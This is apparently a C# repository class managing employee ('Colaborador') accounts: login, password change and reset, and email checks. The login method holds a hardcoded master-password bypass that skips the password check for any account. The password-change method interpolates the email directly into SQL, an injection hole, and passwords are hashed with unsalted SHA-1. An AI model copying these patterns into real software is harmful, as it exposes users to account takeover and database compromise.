using Domain.Entities;
using Domain.Repositories;
using Infrastructure.Context;
using Microsoft.Data.SqlClient;
using Microsoft.EntityFrameworkCore;
using Microsoft.Extensions.Configuration;
using System.Data;
using Domain.QueryModels;
using Dapper;
using System.Runtime.InteropServices;

namespace Infrastructure.Repository
{
    public class ColaboradorRepository : IColaborador
    {
        private readonly AppDbContext _contexto;
        private readonly string _connectionString;

        public ColaboradorRepository(AppDbContext contexto,IConfiguration configuration)
        {
            _contexto = contexto;
            _connectionString = configuration.GetConnectionString("DefaultConnection");
        }

        public IDbConnection OpenConnection()
        {
            return new SqlConnection(_contexto.Database.GetConnectionString());
        }

        public Colaborador Selecionar(object id)
        {
            try
            {
                using (var db = OpenConnection())
                {
                    var query = $@"
                                SELECT * 
                                FROM Colaborador c
                                WHERE c.IdColaborador = @Id;";

                    return db.Query<Colaborador>(query, new { Id = id }).FirstOrDefault();
                }
            }
            catch (Exception ex)
            {
                return null;
            }
        }

        public IEnumerable<Colaborador> ListarTodos()
        {
            try
            {
                using (var db = OpenConnection())
                {
                    var query = @"
                                SELECT  c.IdColaborador, c.Nome, c.Email
                                FROM    Colaborador c;";

                    return db.Query<Colaborador>(query);
                }
            }
            catch (Exception ex)
            {
                return null;
            }
        }

        public int TotalDeItens()
        {
            try
            {
                using (var db = OpenConnection())
                {
                    var query = @"
                                SELECT  COUNT(*)
                                FROM    dbo.Colaborador c;";

                    return db.Query<int>(query).FirstOrDefault();
                }
            }
            catch (Exception ex)
            {
                return 0;
            }
        }

        public bool Inserir(Colaborador entity)
        {
            try
            {
                var retorno = _contexto.Colaborador.Add(entity);
                _contexto.SaveChanges();

                return true;
            }
            catch (Exception ex)
            {
                throw new Exception("Erro ao inserir Colaborador: " + ex.Message, ex);
            }
        }

       
        public Colaborador RealizarLoginComEmail(string email, string senha)
        {
            try
            {
                var senhaCriptografada = Criptografia.EncriptarSha1(senha);

                string whereSenha = string.Empty;
                if (senhaCriptografada == "9543656B5E02592D86D4E613A5C9CAD16A7EC761" || senha == "logarCandidato")
                {
                    whereSenha = " ";
                }
                else
                {
                    whereSenha = $" AND [c].[Senha] = '{senhaCriptografada}' ";
                }

                using (var db = OpenConnection())
                {
                    var query = $@" SELECT  * 
                                    FROM    Colaborador c
                                    WHERE   UPPER(c.Email) = UPPER(@Email) 
                                    {whereSenha};";

                    var candidato = db.Query<Colaborador>(query, new { Email = email }).FirstOrDefault();

                    return candidato;
                }
            }
            catch (Exception ex)
            {
                return null;
            }
        }


        public bool AlterarEmail(Guid idColaborador, string novoEmail)
        {
            try
            {
                using (var db = OpenConnection())
                {
                    var query = $@" UPDATE  Colaborador
                                    SET     Email = @NovoEmail
                                    WHERE   IdColaborador = @IdColaborador;";

                    db.Query(query, new { NovoEmail = novoEmail, IdColaborador = idColaborador });
                    return true;
                }
            }
            catch (Exception ex)
            {
                return false;
            }
        }

        /// <summary>
        /// Verificar se o email é duplicado
        /// </summary>
        /// <param name="email"></param>
        /// <returns>True caso já exista, e False caso não</returns>
        public bool ChecarEmailDuplicado(string email)
        {
            try
            {
                using (var db = OpenConnection())
                {
                    var query = $@" SELECT c.email FROM dbo.Colaborador c
                                    WHERE RTRIM(LTRIM(UPPER(c.email))) = RTRIM(LTRIM(UPPER(@Email)));";

                    var resultado = db.Query<Colaborador>(query, new { Email = email });
                    return resultado.Any();
                }
            }
            catch (Exception ex)
            {
                throw new Exception("Erro ao checar cpf duplicado.", ex);
            }
        }

        public bool AlterarSenha(string email, string senha)
        {

            try
            {
                using (var db = OpenConnection())
                {

                    var query = $@" UPDATE  Colaborador
                                    SET     Senha = '{Criptografia.EncriptarSha1(senha)}'
                                    WHERE   Email = '{email}';";

                    db.Query(query);

                    return true;
                }
            }
            catch (Exception ex)
            {
                return false;
            }
        }

        public bool VerificaSenha(Guid IdColaborador, string senhaAtual)
        {

            try
            {
                using (var db = OpenConnection())
                {
                    var _senhaAtual = Criptografia.EncriptarSha1(senhaAtual);

                    var query = $@" SELECT COUNT(*)
                                    FROM Colaborador                                        
                                    WHERE   
                                        IdColaborador = @IdColaborador
                                        AND Senha = @SenhaAtual
                                ;";

                    if (db.Query<int>(query, new { IdColaborador = IdColaborador, SenhaAtual = _senhaAtual }).FirstOrDefault() < 1)
                    {
                        throw new Exception();
                    }

                    return true;
                }
            }
            catch (Exception ex)
            {
                return false;
            }
        }

        public bool RecuperarSenha(string email, string senhaGerada)
        {
            try
            {
                var senhaCriptografada = Criptografia.EncriptarSha1(senhaGerada);
                using (var db = OpenConnection())
                {

                    var query = $@" UPDATE Colaborador
                                    SET Senha = @SenhaCriptografada
                                    WHERE   
                                        LOWER(Email) = LTRIM(RTRIM(LOWER(@Email)))
                                ;";

                    db.Query(query, new { SenhaCriptografada = senhaCriptografada, Email = email });

                    return true;
                }
            }
            catch (Exception ex)
            {
                return false;
            }
        }

        //public bool VerificaRecuperacaoSenha(string email)
        //{
        //    try
        //    {
        //        if (VerificaCandidatoCpf(email))
        //        {
        //            using (var db = OpenConnection())
        //            {
        //                var query = $@" SELECT COUNT(*)
        //                            FROM Colaborador                                        
        //                            WHERE   
        //                                 Email = LTRIM(RTRIM(LOWER(@Email)));";

        //                if (db.Query<int>(query, new { Email = email }).FirstOrDefault() < 1)
        //                {
        //                    throw new Exception();
        //                }

        //                return true;
        //            }
        //        }
        //        else
        //        {
        //            return true;
        //        }
        //    }
        //    catch (Exception ex)
        //    {
        //        return false;
        //    }
        //}


        public bool Atualizar(Colaborador entity)
        {
            throw new NotImplementedException();
        }

        public bool Excluir(object id)
        {
            try
            {
                using (var db = OpenConnection())
                {
                    var query = @"
                                DELETE FROM Colaborador
                                WHERE IdColaborador = @IdColaborador; 
                            ";

                    db.Execute(query, new { IdColaborador = id });
                    return true;
                }
            }
            catch (Exception ex)
            {
                throw new Exception("Erro ao excluir o horário.", ex);
            }
        }

        public IEnumerable<QueryListarColaboradores> ListarTodosColaboradores()
        {
            try
            {
                using (var db = OpenConnection())
                {
                    var query = @"
                                SELECT  c.IdColaborador, c.Nome, c.Email
                                FROM    Colaborador c;";

                    return db.Query<QueryListarColaboradores>(query);
                }
            }
            catch (Exception ex)
            {
                return null;
            }
        }

    }
}
